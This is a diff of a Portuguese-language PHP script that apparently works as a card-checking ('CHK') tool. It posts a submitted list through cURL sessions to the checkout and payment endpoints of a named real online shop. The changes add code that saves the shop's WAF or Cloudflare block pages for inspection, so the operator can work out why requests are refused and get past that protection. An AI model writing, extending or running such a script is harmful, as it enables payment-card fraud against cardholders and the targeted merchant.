@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHK DO PECINHA - COM COOKIE JAR E RETORNO REAL
+// ✅ CHK DO PECINHA - COM COOKIE JAR E DEBUG DE WAF
 // =====================================================
 
 session_start();
@@ -53,7 +53,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     $url_checkout = "https://franadesivos.com.br/checkout";
     $url_pay = "https://franadesivos.com.br/checkout/pay";
 
-    // ETAPA A: Acessa a página de checkout primeiro para gerar os cookies de sessão e token CSRF se houver
+    // ETAPA A: Acessa a página de checkout primeiro para gerar os cookies de sessão
     $ch_init = curl_init($url_checkout);
     curl_setopt($ch_init, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch_init, CURLOPT_COOKIEJAR, $cookie_file);
@@ -110,9 +110,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
             $status_site = $resposta_json['status'] ?? 'failed';
             $retorno_msg = $resposta_json['message'] ?? $resposta_json['error'] ?? 'Retorno sem mensagem';
         } else {
-            // Se o site retornou HTML/Texto (ex: Bloqueio Cloudflare ou erro 500)
             $status_site = 'failed';
-            $retorno_msg = "Retorno não-JSON (Possível WAF/Bloqueio)";
+            // Salva o retorno bruto em arquivo para inspeção caso ocorra bloqueio de WAF/Cloudflare
+            file_put_contents(__DIR__ . '/debug_resposta.html', $resposta_bruta);
+            $retorno_msg = "Bloqueado pelo site (HTML salvo em debug_resposta.html)";
         }
     }
 
@@ -220,7 +221,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
                     <span id="contador" class="text-xs text-zinc-500 font-mono">Progresso: 0 / 0</span>
                 </div>
                 <div id="resultado" class="w-full h-56 bg-black border border-zinc-800 rounded-xl p-4 text-xs font-mono overflow-y-auto text-zinc-400 space-y-2 selection:bg-zinc-800">
-                    <span class="text-zinc-600">// Sistema pronto para iniciar as requisições com cookies reais...</span>
+                    <span class="text-zinc-600">// Sistema pronto para iniciar as requisições com debug ativo...</span>
                 </div>
             </div>
         </div>
